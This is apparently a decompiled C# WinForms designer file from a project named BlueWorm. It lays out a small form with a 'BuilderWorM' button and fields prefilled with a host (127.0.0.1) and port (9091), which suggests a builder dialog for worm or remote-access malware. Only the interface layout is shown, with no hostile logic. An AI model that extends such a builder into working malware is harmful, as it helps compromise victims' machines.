namespace BlueWorm
{
	// Token: 0x02000013 RID: 19
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Form6 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000110 RID: 272 RVA: 0x00008D14 File Offset: 0x00006F14
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.icontainer_0 != null)
				{
					this.icontainer_0.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00008D58 File Offset: 0x00006F58
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::BlueWorm.Form6));
			this.Button1 = new global::System.Windows.Forms.Button();
			this.TextBox1 = new global::System.Windows.Forms.TextBox();
			this.TextBox2 = new global::System.Windows.Forms.TextBox();
			this.SuspendLayout();
			this.Button1.BackColor = global::System.Drawing.Color.Transparent;
			this.Button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.Button1.ForeColor = global::System.Drawing.Color.Black;
			global::System.Windows.Forms.Control button = this.Button1;
			global::System.Drawing.Point location = new global::System.Drawing.Point(112, 26);
			button.Location = location;
			this.Button1.Name = "Button1";
			global::System.Windows.Forms.Control button2 = this.Button1;
			global::System.Drawing.Size size = new global::System.Drawing.Size(91, 28);
			button2.Size = size;
			this.Button1.TabIndex = 0;
			this.Button1.Text = "BuilderWorM";
			this.Button1.UseVisualStyleBackColor = false;
			global::System.Windows.Forms.Control textBox = this.TextBox1;
			location = new global::System.Drawing.Point(9, 2);
			textBox.Location = location;
			this.TextBox1.Name = "TextBox1";
			global::System.Windows.Forms.Control textBox2 = this.TextBox1;
			size = new global::System.Drawing.Size(194, 20);
			textBox2.Size = size;
			this.TextBox1.TabIndex = 3;
			this.TextBox1.Text = "127.0.0.1";
			global::System.Windows.Forms.Control textBox3 = this.TextBox2;
			location = new global::System.Drawing.Point(9, 26);
			textBox3.Location = location;
			this.TextBox2.Name = "TextBox2";
			global::System.Windows.Forms.Control textBox4 = this.TextBox2;
			size = new global::System.Drawing.Size(97, 20);
			textBox4.Size = size;
			this.TextBox2.TabIndex = 4;
			this.TextBox2.Text = "9091";
			global::System.Drawing.SizeF autoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			size = new global::System.Drawing.Size(207, 57);
			this.ClientSize = size;
			this.Controls.Add(this.TextBox2);
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.Button1);
			this.ForeColor = global::System.Drawing.Color.Black;
			this.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
			this.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximizeBox = false;
			this.Name = "Form6";
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x0400006C RID: 108
		private global::System.ComponentModel.IContainer icontainer_0;
	}
}
